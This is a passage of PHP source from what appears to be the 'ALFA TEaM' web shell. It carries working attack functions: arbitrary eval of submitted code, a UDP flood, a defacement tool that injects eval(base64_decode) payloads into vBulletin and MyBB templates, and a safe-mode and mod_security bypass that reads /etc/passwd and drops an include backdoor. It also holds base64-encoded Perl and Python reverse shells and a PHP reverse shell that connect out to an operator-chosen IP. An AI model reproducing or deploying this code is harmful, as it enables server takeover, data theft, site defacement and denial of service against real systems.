<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
</form></table></div>";
alfafooter();
}
function alfaFilesTools() {
if( isset($_POST['alfa1']) )
$_POST['alfa1'] = urldecode($_POST['alfa1']);
if(@$_POST['alfa2']=='download') {
if(@is_file($_POST['alfa1']) && @is_readable($_POST['alfa1'])) {
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=".basename($_POST['alfa1']));
if (function_exists("mime_content_type")) {
$type = @mime_content_type($_POST['alfa1']);
header("Content-Type: " . $type);
} else
header("Content-Type: application/octet-stream");
$fp = @fopen($_POST['alfa1'], "r");
if($fp) {
while(!@feof($fp))
echo @fread($fp, 1024);
fclose($fp);
}
}exit;
}
if( @$_POST['alfa2'] == 'mkfile' ) {
if(!file_exists($_POST['alfa1'])) {
$fp = @fopen($_POST['alfa1'], 'w');
if($fp) {
$_POST['alfa2'] = "edit";
fclose($fp);
}
}
}
alfahead();
echo '<div class=header>';
if( !file_exists(@$_POST['alfa1']) ) {
echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#ffffff\">FILE DOEST NOT EXITS(Deleted)<b></font> </pre></div>";
alfaFooter();
return;
}
$uid = @posix_getpwuid(@fileowner($_POST['alfa1']));
if(!$uid) {
$uid['name'] = @fileowner($_POST['alfa1']);
$gid['name'] = @filegroup($_POST['alfa1']);
} else $gid = @posix_getgrgid(@filegroup($_POST['alfa1']));
echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['alfa1'])).' <span>Size:</span> '.(is_file($_POST['alfa1'])?alfaSize(filesize($_POST['alfa1'])):'-').' <span>Permission:</span> '.alfaPermsColor($_POST['alfa1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
echo '<br>';
if( empty($_POST['alfa2']) )
$_POST['alfa2'] = 'view';
if( is_file($_POST['alfa1']) )
$m = array('View', 'Highlight', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch');
else
$m = array('Chmod', 'Rename', 'Touch');
foreach($m as $v)
echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')"><span>'.((strtolower($v)==@$_POST['alfa2'])?'<b><span> '.$v.' </span> </b>':$v).' </span></a> ';
echo '<br><br>';
switch($_POST['alfa2']) {
case 'view':
echo '<pre class=ml1>';
$fp = @fopen($_POST['alfa1'], 'r');
if($fp) {
while( !@feof($fp) )
echo htmlspecialchars(@fread($fp, 1024));
@fclose($fp);
}
echo '</pre>';
break;
case 'highlight':
if( @is_readable($_POST['alfa1']) ) {
echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
$code = @highlight_file($_POST['alfa1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
}
break;
case 'chmod':
if( !empty($_POST['alfa3']) ) {
$perms = 0;
for($i=strlen($_POST['alfa3'])-1;$i>=0;--$i)
$perms += (int)$_POST['alfa3'][$i]*pow(8, (strlen($_POST['alfa3'])-$i-1));
if(!@chmod($_POST['alfa1'], $perms))
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';
}
clearstatcache();
echo '<script>alfa3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['alfa1'])),-4).'"><input type=submit value=">>"></form>';
break;
case 'edit':
if( !is_writable($_POST['alfa1'])) {
echo 'File isn\'t writeable';
break;
}
if( !empty($_POST['alfa3']) ) {
$time = @filemtime($_POST['alfa1']);
$_POST['alfa3'] = substr($_POST['alfa3'],1);
$fp = @fopen($_POST['alfa1'],"w");
if($fp) {
@fwrite($fp,$_POST['alfa3']);
@fclose($fp);
echo 'Saved!<br><script>alfa3_="";</script>';
@touch($_POST['alfa1'],$time,$time);
}
}
echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
$fp = @fopen($_POST['alfa1'], 'r');
if($fp) {
while( !@feof($fp) )
echo htmlspecialchars(@fread($fp, 1024));
@fclose($fp);
}
echo '</textarea><input type=submit value=">>"></form>';
break;
case 'hexdump':
$c = @file_get_contents($_POST['alfa1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
$h[1] .= sprintf('%02X',ord($c[$i])).' ';
switch ( ord($c[$i]) ) {
case 0: $h[2] .= ' '; break;
case 9: $h[2] .= ' '; break;
case 10: $h[2] .= ' '; break;
case 13: $h[2] .= ' '; break;
default: $h[2] .= $c[$i]; break;
}
$n++;
if ($n == 32) {
$n = 0;
if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
$h[1] .= '<br>';
$h[2] .= "\n";
}
}
echo '<table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
break;
case 'rename':
if( !empty($_POST['alfa3']) ) {
if(!@rename($_POST['alfa1'], $_POST['alfa3']))
echo 'Can\'t rename!<br>';
else
die('<script>g(null,null,"'.urlencode($_POST['alfa3']).'",null,"")</script>');
}
echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['alfa1']).'"><input type=submit value=">>"></form>';
break;
case 'touch':
if( !empty($_POST['alfa3']) ) {
$time = strtotime($_POST['alfa3']);
if($time) {
if(!touch($_POST['alfa1'],$time,$time))
echo 'Fail!';
else
echo 'Touched!';
} else echo 'Bad time format!';
}
clearstatcache();
echo '<script>alfa3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['alfa1'])).'"><input type=submit value=">>"></form>';
break;
}
echo '</div>';
alfaFooter();
}
function alfaphpeval()
{
alfahead();
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')) {
echo '<div class=header>';
ob_start();
$INI=ini_get_all();
print '<table border=0><tr>'
.'<td class="listing"><font class="highlight_txt">Param</td>'
.'<td class="listing"><font class="highlight_txt">Global value</td>'
.'<td class="listing"><font class="highlight_txt">Local Value</td>'
.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($INI as $param => $values)
print "\n".'<tr>'
.'<td class="listing"><b>'.$param.'</td>'
.'<td class="listing">'.$values['global_value'].' </td>'
.'<td class="listing">'.$values['local_value'].' </td>'
.'<td class="listing">'.$values['access'].' </td></tr>';
$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
echo str_replace('<h1','<h2', $tmp) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
echo '<div class=header><style>.p {color:#000;}</style>';
ob_start();
phpinfo();
$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
echo str_replace('<h1','<h2', $tmp) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
echo '<div class=header>';
ob_start();
$EXT=get_loaded_extensions ();
print '<table border=0><tr><td class="listing">'
.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT)
.'</td></tr></table>'
.count($EXT).' extensions loaded';
echo '</div><br>';
}
if(empty($_POST['ajax']) && !empty($_POST['alfa1']))
$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
echo '<div class=header><Center><a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=# onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):'').'</textarea><center><input type=submit value=Eval style="margin-top:5px"></center>';
echo '</form><pre id=PhpOutput style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
if(!empty($_POST['alfa1'])) {
ob_start();
eval($_POST['alfa1']);
echo htmlspecialchars(ob_get_clean());
}
echo '</pre></div>';
alfafooter();
}
function alfahash()
{
if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
$stringTools = array(
'Base64 encode' => 'base64_encode',
'Base64 decode' => 'base64_decode',
'md5 hash' => 'md5',
'sha1 hash' => 'sha1',
'crypt' => 'crypt',
'CRC32' => 'crc32',
'Url encode' => 'urlencode',
'Url decode' => 'urldecode',
'Full urlencode' => 'full_urlencode',
'Htmlspecialchars' => 'htmlspecialchars',
);
alfahead();
echo '<div class=header>';
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
echo "<form onSubmit='g(null,null,this.selectTool.value,this.input.value); return false;'><select name='selectTool'>";
foreach($stringTools as $k => $v)
echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
echo "</select><input type='submit' value='>>'/><br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['alfa1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
if(!empty($_POST['alfa1'])) {
if(in_array($_POST['alfa1'], $stringTools))echo htmlspecialchars($_POST['alfa1']($_POST['alfa2']));
}
echo "</div>";
alfaFooter();
}
function alfados()
{
alfahead();
echo '<div class=header>';
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
echo '<center><span>| UDP |</span><br><br><form onSubmit="g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;" method=POST><span>Host : </span><input name="udphost" type="text" size="25" /><span> Time : </span><input name="udptime" type="text" size="15" /><span> Port : </span><input name="udpport" type="text" size="10" /><input type="submit" value=">>" /></form></center>';
echo "<pre class='ml1' style='".(empty($_POST['alfa1'])?'display:none;':'')."margin-top:5px' >";
if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3']))
{
$packets=0;
ignore_user_abort(true);
$exec_time=$_POST['alfa2'];
$time=time();
$max_time=$exec_time+$time;
$host=$_POST['alfa1'];
$portudp=$_POST['alfa3'];
for($i=0;$i<65000;$i++)
{
$out .= 'X';
}
while(1){
$packets++;
if(time() > $max_time){
break;
}
$fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}
}
echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
echo "</pre>";
}
echo '</div>';
alfafooter();
}
function alfaIndexChanger(){
alfahead();
echo '<div class=header><script>alfa1_=alfa2_=alfa3_=alfa4_="";</script><center><h3><span>| Index Changer |</span></h3><center><h3><a href=# onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=# onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')) {
echo "<script>alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=\"\";</script><center><table border=0 width='100%'>
<tr><td>
<center><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">vBulletin</font> <font color=\"#FFFFFF\">Index</font> <font color=\"#FF0000\">Changer</font><font color=\"#FFFF01\"> ==</font></b>
<p> <center><form onSubmit=\"g('IndexChanger',null,'vb',null,null,null,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\" method=POST>
<table border=1>
<tr><td><font color='#FFFFFF'><b>Mysql Host</b></font></td>
<td><input type=text name=dbh value=localhost size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db User</b><br></font></td>
<td> <input type=text name=dbu size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db Name</b><br></font></td>
<td> <input type=text name=dbn size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db Pass</b><br></font></td>
<td> <input type=text name=dbp size='50' ></td></tr>
</table>
<font color='#FFFF01' size=\"3\"><b>your index</b></font><br>
<textarea name=index rows='19' cols='103' style='color: #FFFFFF; background-color: #000000'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type=submit value='>>'>
</form></center></td></tr>
</table></center>";
if(isset($_POST['alfa6'])) {
$s0levisible="Powered By Solevisible";
$dbu = $_POST['alfa6'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$index = $_POST['alfa10'];
$index=str_replace("\'","'",$index);
$set_index = "{\${eval(base64_decode(\'";
$set_index .= base64_encode("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}</textarea>";
if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index))
{
mysql_connect($dbh,$dbu,$dbp) or die(mysql_error());
mysql_select_db($dbn) or die(mysql_error());
$loli1 = "UPDATE template SET template='".$set_index."".$s0levisible."' WHERE title='spacer_open'";
$loli2 = "UPDATE template SET template='".$set_index."".$s0levisible."' WHERE title='FORUMHOME'";
$loli3 = "UPDATE style SET css='".$set_index."".$s0levisible."', stylevars='', csscolors='', editorstyles=''";
$result = mysql_query($loli1) or die (mysql_error());
$result = mysql_query($loli2) or die (mysql_error());
$result = mysql_query($loli3) or die (mysql_error());
echo "<script>alert('VB index changed');</script>";
}
}
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'mybb')) {
echo "<script>alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=\"\";</script><center><table border=0 width='100%'>
<tr><td>
<center><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">Mybb</font> <font color=\"#FFFFFF\">Index</font> <font color=\"#FF0000\">Changer</font><font color=\"#FFFF01\"> ==</font></b>
<p><center><form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
<table border=1>
<tr><td><font color='#FFFFFF'><b>Mysql Host</b></font></td>
<td><input type=text name=mybbdbh value=localhost size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db User</b><br></font></td>
<td> <input type=text name=mybbdbu size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db Name</b><br></font></td>
<td> <input type=text name=mybbdbn size='50' ></td></tr>
<tr><td><font color='#FFFFFF'><b>Db Pass</b><br></font></td>
<td> <input type=text name=mybbdbp size='50' ></td></tr>
</table>
<font color='#FFFF01' size=\"3\"><b>your index</b></font><br>
<textarea name=mybbindex rows='19' cols='103' style='color: #FFFFFF; background-color: #000000'>
<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type=submit value='>>' >
</form></center></td></tr></table></center>";
if(isset($_POST['alfa6'])) {
$mybb_dbh = $_POST['alfa6'];
$mybb_dbu = $_POST['alfa7'];
$mybb_dbn = $_POST['alfa8'];
$mybb_dbp = $_POST['alfa9'];
$mybb_index = $_POST['alfa10'];
if (!empty($mybb_dbh) && !empty($mybb_dbu) && !empty($mybb_dbn) && !empty($mybb_index))
{
mysql_connect($mybb_dbh,$mybb_dbu,$mybb_dbp) or die(mysql_error());
mysql_select_db($mybb_dbn) or die(mysql_error());
$prefix="mybb_";
$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
$result = mysql_query($loli7) or die (mysql_error());
echo "<script>alert('MyBB index changed');</script>";
}
}
}
echo "</div>";
alfafooter();
}
function alfaproc()
{
alfahead();
echo "<Div class=header><center>";
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
if($GLOBALS['sys']=="win")
{
$process=array(
"System Info" =>"systeminfo",
"Active Connections" => "netstat -an",
"Running Services" => "net start",
"User Accounts" => "net user",
"Show Computers" => "net view",
"ARP Table" => "arp -a",
"IP Configuration" => "ipconfig /all"
);
}
else
{
$process=array(
"Process status" => "ps aux",
"Syslog" =>"cat /etc/syslog.conf",
"Resolv" => "cat /etc/resolv.conf",
"Hosts" =>"cat /etc/hosts",
"Cpuinfo"=>"cat /proc/cpuinfo",
"Version"=>"cat /proc/version",
"Sbin"=>"ls -al /usr/sbin",
"Interrupts"=>"cat /proc/interrupts",
"lsattr"=>"lsattr -va",
"Uptime"=>"uptime",
"Fstab" =>"cat /etc/fstab",
);}
foreach($process as $n => $link)
{
echo '<a href="#" onclick="g(null,null,\''.$link.'\')"> | '.$n.' | </a>';
}
echo "</center>";
if(!empty($_POST['alfa1']))
{
echo "<pre class='ml1' style='margin-top:5px' >";
echo alfaEx($_POST['alfa1']);
echo '</pre>';
}
echo "</div>";
alfafooter();
}
function alfasafe()
{
alfahead();
echo "<div class=header><script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_=\"\"</script><center><h3><span>| Atuo ByPasser |</span></h3>";
echo '<h3><a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(apache) | </a><a href=# onclick="g(null,null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=# onclick="g(null,null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=# onclick="g(null,null,null,null,null,null,\'users\')">| Read-Users | </a><a href=# onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=# onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains')
{if(!@file_exists("/etc/virtual/domainowners")){
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>";
$solevisible9 = @file('/etc/named.conf');
foreach($solevisible9 as $solevisible13){
if(@eregi('zone',$solevisible13)){
preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
if(strlen(trim($solevisible14[1][0])) > 2){
echo $solevisible14[1][0].'<br>';
}}}
}else{
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br>".
$users = @file("/etc/virtual/domainowners");
foreach($users as $boz){
$dom = explode(":",$boz);
echo $dom[0]."\n";
}}}
if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases')
{
echo '<center><script>alfa6_=alfa7_=alfa9_=\"\"</script>
<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,this.go.value); return false;" method="post" action="" />
<input type="text" placeholder="site.com" name="site" />
<input type="submit" value=">>" name="go" />
</form></center>
';
if($_POST['alfa9'] && $_POST['alfa9'] == '>>')
{
if(!@file_exists("/etc/virtual/domainowners")){
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
$site = trim($_POST['alfa7']);
$rep = str_replace(array("https://","http://","www."),"",$site);
if($user = posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
if($user['name']!= 'root'){
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\">
<center>
<table border=1>
<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user['name']}</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr>
</table>
</center>";}}}
else {echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br/><center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
}else{
$site = trim($_POST['alfa7']);
$rep = str_replace(array("https://","http://","www."),"",$site);
$users = @file("/etc/virtual/domainowners");
foreach($users as $boz){
$ex = explode(":",$boz);
if($ex[0] == $rep){
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\">
<center>
<table border=1>
<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
if(!empty($_POST['alfa5']) && isset($_POST['alfa5']))
{
if(!@file_exists("/etc/virtual/domainowners")){
echo '<pre id="strOutput" style="margin-top:5px" class="ml1">';
$i = 0;
while ($i < 60000) {
$line = posix_getpwuid($i);
if (!empty($line)) {
while (list ($key, $vl) = each($line)){
echo $vl."\n";
break;}}$i++;}
}else{echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br>';
$users = @file("/etc/virtual/domainowners");
foreach($users as $boz){
$user = explode(":",$boz);
echo trim($user[1]).'<br>';}}}
if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
echo '<pre id="strOutput" style="margin-top:5px" class="ml1">';
if(function_exists("system") || function_exists("exec") || function_exists("passthru") || function_exists("shell_exec")){echo alfaEx("cat /etc/passwd");}
elseif(function_exists("file_get_contents") && is_readable("/etc/passwd")){
echo file_get_contents("/etc/passwd");}
elseif(function_exists("posix_getpwuid")){
for($uid=0;$uid<60000;$uid++){
$ara = @posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}print "\n";}}
} else{echo '<script>alert("Error in bypass... im sorry:\(")</script>';}}
if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
$fil=fopen($GLOBALS['cwd'].".htaccess","w");
fwrite($fil,'#Generated By Sole Sad and Invisible
<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>');
fclose($fil);
echo '<script>alert("htaccess for Apache is created...!")</script>';
}
if(!empty($_POST['alfa1'])&& isset($_POST['alfa1']))
{
$fil=fopen($GLOBALS['cwd']."php.ini","w");
fwrite($fil,'safe_mode=OFF
disable_functions=ByPass By Sole Sad & Invisible(ALFA TEaM)');
fclose($fil);
$file2=fopen($GLOBALS['cwd']."ini.php","w");
fwrite($file2,'<?
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["file"]);
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
?>');
fclose($file2);
echo '<script>alert("php.ini && ini.php is created...!")</script>';
}
if(!empty($_POST['alfa3']) && isset($_POST['alfa3']))
{
$fil=fopen($GLOBALS['cwd'].".htaccess","w");
fwrite($fil,'#Generated By Sole Sad and Invisible
<Files *.php>
ForceType application/x-httpd-php4
</Files>
ahm tas: <IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>');
fclose($fil);
echo '<script>alert("htaccess for Litespeed is created...!")</script>';
}
echo "<br></div>";
alfafooter();
}
function alfaconnect()
{
alfahead();
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
$back_connect_py="IyEvdXNyL2Jpbi9weXRob24NCg0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KDQpob3N0ID0gc3lzLmFyZ3ZbMV0NCnBvcnQgPSBpbnQoc3lzLmFyZ3ZbMl0pDQoNCnNvY2tldC5zZXRkZWZhdWx0dGltZW91dCg2MCkNCg0KZGVmIGJjKCk6DQogIHRyeToNCiAgICBzb2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICBzb2suY29ubmVjdCgoaG9zdCxwb3J0KSkNCiAgICBzb2suc2VuZCgnJydzb2xldmlzaWJsZUBnbWFpbC5jb21cblxuJycnKQ0KICAgIG9zLmR1cDIoc29rLmZpbGVubygpLDApDQogICAgb3MuZHVwMihzb2suZmlsZW5vKCksMSkNCiAgICBvcy5kdXAyKHNvay5maWxlbm8oKSwyKQ0KICAgIG9zLmR1cDIoc29rLmZpbGVubygpLDMpDQogICAgc2hlbGwgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkNCiAgZXhjZXB0IHNvY2tldC50aW1lb3V0Og0KICAgIHByaW50ICJbIV0gQ29ubmVjdGlvbiB0aW1lZCBvdXQiDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3IsIGU6DQogICAgcHJpbnQgIlshXSBFcnJvciB3aGlsZSBjb25uZWN0aW5nIiwgZQ0KICANCmJjKCk=";
echo "<div class=header><center><h3><span>| Back Connect |</span></h3>";
echo "<form onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"><span><font color=\"#00A220\">PERL BACK CONNECT</font><br></span><br><font color=\"#00A220\"><b>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form></b></font>";
echo "<br><form onSubmit=\"g(null,null,'php',this.server.value,this.port.value);return false;\"><span>PHP BACK CONNECT<br></span><br><font color=\"#FFFFFF\"><b>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form><br>";
echo "<br><form onSubmit=\"g(null,null,'py',this.server.value,this.port.value);return false;\"><span><font color=\"#FF0000\">PYTHON BACK CONNECT</font><br></span><br><font color=\"#FF0000\"><b>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form></center><br>";
if(isset($_POST['alfa1'])) {
function cf($f,$t) {
$w = @fopen($f,"w") or @function_exists('file_put_contents');
if($w){
@fwrite($w,@base64_decode($t));
@fclose($w);
}
}
if($_POST['alfa1'] == 'bcp') {
cf("/tmp/bc.pl",$back_connect_p);
$out = alfaEx("perl /tmp/bc.pl ".$_POST['alfa2']." ".$_POST['alfa3']." 1>/dev/null 2>&1 &");
echo "<pre class=ml1 style='margin-top:5px'>Successfully opened reverse shell to ".$_POST['alfa2'].":".$_POST['alfa3']."<br>Connecting...[Perl]</pre>";
@unlink("/tmp/bc.pl");
}
if($_POST['alfa1'] == 'py') {
cf("/tmp/bc.py",$back_connect_py);
$out = alfaEx("python /tmp/bc.py ".$_POST['alfa2']." ".$_POST['alfa3']." 1>/dev/null 2>&1 &");
echo "<pre class=ml1 style='margin-top:5px'>Successfully opened reverse shell to ".$_POST['alfa2'].":".$_POST['alfa3']."<br>Connecting...[Python]</pre>";
@unlink("/tmp/bc.py");
}
if($_POST['alfa1']=='php')
{
@set_time_limit (0);
$ip = $_POST['alfa2'];
$port =$_POST['alfa3'];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
echo "<pre class=ml1 style='margin-top:5px'>";
if (function_exists('pcntl_fork')) {
$pid = pcntl_fork();
if ($pid == -1) {
echo "Cant fork!<br>";
exit(1);
}
if ($pid) {
exit(0);
}
if (posix_setsid() == -1) {
echo "Error: Can't setsid()<br>";
exit(1);
}
$daemon = 1;
} else {
echo "WARNING: Failed to daemonise. This is quite common and not fatal<br>";
}
chdir(htmlspecialchars($GLOBALS['cwd']));
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
echo "$errstr ($errno)";
exit(1);
}
$descriptorspec = array(
0 => array("pipe", "r"),
1 => array("pipe", "w"),
2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
echo "ERROR: Can't spawn shell<br>";
exit(1);
}
@stream_set_blocking($pipes[0], 0);
@stream_set_blocking($pipes[1], 0);
@stream_set_blocking($pipes[2], 0);
